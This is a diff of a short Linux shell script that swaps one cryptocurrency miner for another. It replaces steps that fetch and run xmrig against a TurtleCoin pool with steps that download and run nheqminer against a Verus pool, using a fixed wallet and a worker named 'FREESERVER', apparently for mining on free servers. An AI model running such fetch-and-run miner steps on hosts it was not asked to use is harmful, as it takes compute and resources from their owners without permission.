@@ -1,6 +1,7 @@
 apt update
 apt upgrade -y
-wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz
-tar -xvf xmrig-6.15.0-linux-static-x64.tar.gz
-cd xmrig-6.15.0
-./xmrig --donate-level 1 -o de.turtlecoin.herominers.com:1160 -u TRTLux4h4acBsmQoXsxEXBCXRmugTbWkCSg2NCj8VAWETuqdsc99zfwbYcTggiVNgujVhMKWJ9U3HctoHqJKjayGQXAPgwYtw1i -p test2 -a argon2/chukwav2 -k
+wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
+tar zxvf nheqminer-Linux-v0.8.2.tgz
+tar xvf nheqminer-Linux-v0.8.2.tar.gz
+cd nheqminer
+./nheqminer -v -l eu.luckpool.net:3956 -u RG2qMvN329DtkpAgQwniYgcg5TpzES2L3n.FREESERVER -p x -t 8
